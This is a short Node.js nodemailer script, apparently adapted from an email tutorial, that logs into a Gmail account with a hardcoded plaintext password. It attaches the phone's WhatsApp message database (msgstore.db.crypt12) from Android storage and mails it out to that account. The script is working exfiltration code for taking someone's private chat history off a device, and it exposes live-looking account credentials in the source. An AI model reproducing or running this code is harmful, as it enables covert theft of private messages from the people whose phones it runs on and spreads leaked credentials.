/*
    Video: https://www.youtube.com/watch?v=9zEhGUIUwxY
    Don't forget to disable less secure app from Gmail: https://myaccount.google.com/lesssecureapps
*/

const nodemailer = require("nodemailer");
const log = console.log;

// Step 1
let transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "nodemailfile@gmail.com", // TODO: your gmail account
    pass: "Parasnath2205", // TODO: your gmail password
  },
});

// Step 2
let mailOptions = {
  from: "nodemailfile@gmail.com", // TODO: email sender
  to: "nodemailfile@gmail.com", // TODO: email receiver
  subject: "Nodemailer - Test",
  text: "Wooohooo it works!!",
  attachments: [
    {
      filename: "msgstore.db.crypt12",
      path: "/storage/emulated/0/WhatsApp/Databases/msgstore.db.crypt12",
    }, // TODO: replace it with your own image  /storage/emulated/0/WhatsApp/Databases/
  ],
};

// Step 3
transporter.sendMail(mailOptions, (err, data) => {
  if (err) {
    return log(err);
  }
  return log("Email sent!!!");
});
